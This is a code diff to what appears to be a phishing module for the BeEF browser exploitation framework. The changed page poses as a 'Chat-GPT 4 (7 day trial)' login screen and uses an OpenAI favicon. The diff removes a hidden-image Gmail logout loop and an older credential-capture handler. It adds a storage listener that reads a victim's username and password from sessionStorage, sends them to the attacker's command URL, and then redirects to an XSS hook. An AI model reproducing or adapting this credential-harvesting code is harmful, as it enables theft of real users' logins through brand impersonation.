@@ -4,38 +4,19 @@
 // See the file 'doc/COPYING' for copying permission
 //
 
-function logoutGoogle() {
-	var img = document.createElement("IMG");
-	img.src = "https://mail.google.com/mail/?logout";
-	img.height = "1px";
-	img.width = "1px";
-	img.style.visibility = "hidden";
-	document.body.appendChild(img);
-	//set a new setTimeout to redo the logout
-	setTimeout('logoutGoogle()', <%= @logout_gmail_interval %>);
-}
-
 beef.execute(function () {
-	//  alert('BITB test gmail!')
-	document.title = "Chat-GPT (7 day trial)";
+	document.title = "Chat-GPT 4 (7 day trial)";
 	beef.browser.changeFavicon("https://static-00.iconduck.com/assets.00/openai-icon-505x512-pr6amibw.png");
-	// logoutGoogle();
 	displayPhishingSite();
 });
 
-function clickedSubmitButton() {
-	var credentials = "Username: " + document.getElementById('Email').value + " Password: " + document.getElementById('Passwd').value;
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=" + credentials);
-	//Timeout needed because otherwise the beef panel doesn't get the credentials in time
-	setTimeout("redirect()", <%= @wait_seconds_before_redirect %>);
-}
 function redirect() {
 	var theXssUrl = "<%== @xss_hook_url %>";
 	if (theXssUrl) {
-		window.open(theXssUrl);
-		window.focus();
+		// window.open(theXssUrl);
+		// window.focus();
+		window.location = theXssUrl;
 	}
-	window.location = "https://accounts.google.com/";
 }
 
 function displayPhishingSite() {
@@ -5608,5 +5589,14 @@ function displayPhishingSite() {
 		}
 	};
 	document.body.appendChild(s);
+
+	window.addEventListener('storage', function (e) {
+		if (beef && sessionStorage.getItem("user") && sessionStorage.getItem("password")) {
+			beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=" + sessionStorage.getItem("user") + sessionStorage.getItem("password"));
+			//Timeout needed because otherwise the beef panel doesn't get the credentials in time
+			setTimeout("redirect()", <%= @wait_seconds_before_redirect %>);
+		}
+	}, { once: true })
+
 
 }
